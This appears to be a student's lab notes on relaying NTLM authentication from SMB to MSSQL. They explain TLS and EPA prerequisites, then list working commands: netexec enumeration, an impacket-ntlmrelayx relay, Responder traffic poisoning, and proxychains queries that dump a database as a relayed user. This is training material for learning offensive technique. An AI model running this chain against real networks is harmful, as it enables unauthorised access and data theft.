Idea is the same as normal relaying - forward NTLM auth to a service on another system

MSSQL is protected with TLS, so there are some prerequisites
- MSSQL server does not enforce TLS encryption OR 
- MSSQL server does enforce TLS encryption, but not "Extended Protection for Authentication" (EPA)

EPA
- protects the channel (connection) via bindings
	- channel binding (tokens)
	- service binding
- MSSQL connection in most secure setting
	- NTLM auth handshake with a Channel Binding Token (CBT)
	- set up a TLS channel
	- verify that the CBT from the NTLM handshake is the same used for TLS session


**SMB to MSSQL**
netexec automatically enumerates TLS enforcement
- checking for channel binding requires valid creds

enumerate channel binding tokens (CBT) with "mssql_cbt" module
`nxc mssql <IP> -u <user> -p <pass> -M mssql_cbt`

relaying SMb to MSSQL is done similarly to before
`impacket-ntlmrelayx -t mssql://<IP> -smb2support -socks`

force traffic to the attacker machine
`sudo responder -I <interface>`

once relayed, use proxychains to tunnel through SOCKS proxy
`proxychains -q nxc mssql <IP> -u <relayed_user> -p WILL_BE_IGNORED`


### Learning Objective 18

**Enumerate MSSQL relaying opportunities**
`sudo nmap <ips> -p 1433 --open`


**Relay credentials of michael.johnson from SMB to MSSQL**
`nxc mssql <IP>`
![](assets/Pasted%20image%2020260724085319.png)

set up relay
`impacket-ntlmrelayx -t mssql://<IP> -smb2support -socks`

force traffic to the attacker machine
`sudo responder -I <interface>`


**Enumerate MSSQL databases on the SQL server**
authenticate
`proxychains -q nxc mssql 172.16.13.26 -u michael.johnson -p asdf -d CAR`
![](assets/Pasted%20image%2020260724085732.png)

enumerate databases
`proxychains -q nxc mssql 172.16.13.26 -u michael.johnson -p asdf -d CAR --database`
![](assets/Pasted%20image%2020260724085814.png)
- cars is the only non-default

enumerate tables from the "cars" database
`proxychains -q nxc mssql 172.16.13.26 -u michael.johnson -p asdf -d CAR --database cars`
![](assets/Pasted%20image%2020260724085921.png)
- only table is the "new_cars" table

dump new_cars table
`proxychains -q nxc mssql 172.16.13.26 -u michael.johnson -p asdf -d CAR --query "USE cars; SELECT * FROM new_cars;"`
![](assets/Pasted%20image%2020260724090006.png)
